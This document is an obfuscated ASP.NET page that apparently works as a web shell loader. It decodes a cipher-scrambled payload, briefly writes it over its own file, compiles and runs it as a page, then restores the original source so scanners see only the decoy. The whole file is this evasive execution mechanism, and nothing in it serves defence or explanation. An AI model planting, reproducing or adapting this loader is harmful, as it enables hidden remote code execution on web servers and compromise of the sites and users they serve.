<%@ Page Language="C#" Debug="true" %> 
<%@ Import namespace="System.IO" %> 
<%@ Import namespace="System.Web.Compilation" %> 
<% 
string iNRLl0XmA3GJ = Request.PhysicalPath; 
string u4Icei4L0jT = "~/" + Request.FilePath; 
string UOZxvUjWszFk = File.ReadAllText(iNRLl0XmA3GJ); 
string kulroWj6 = ""; 
string f8r91IPW = "Z AsW:9xC.EGbS?KVQ}0,>$vce6Ui%BY'/FD\tuw|qzN-n^lRo4Xg_H{a*mp@\\71yLf3[Tk\ntPrO&M2=#()]<5h8+\"J!djI;"; 
string H9m8shX0kZ = "T\nV/\\14LcPSJG0R[O=9%p(\tI?Z<Kz-vM8#wuC$5hdkrFeN'*f7Ya{,B]Qq2x@j^ EDyX|+Wbsn6!om;.:t\"Agl3&>U_)iH}"; 
string ZWKhtZAC = ""; 
ZWKhtZAC += "A-x\ns]aZ\nE]ea$]aZ;>U/?nz2b>-(A-ZI]':*Zd$Z/bPHbZqX>%>\"p>$e/]DZ>t}-("; 
foreach(char c in ZWKhtZAC) { kulroWj6 += H9m8shX0kZ.Contains(c.ToString()) ? f8r91IPW[H9m8shX0kZ.IndexOf(c)] : c; } 
File.WriteAllText(iNRLl0XmA3GJ, kulroWj6); 
Page imkiHTMJ = (Page)BuildManager.CreateInstanceFromVirtualPath(u4Icei4L0jT, typeof(Page)); 
File.WriteAllText(iNRLl0XmA3GJ, UOZxvUjWszFk); 
imkiHTMJ.ProcessRequest(HttpContext.Current); 
%> 
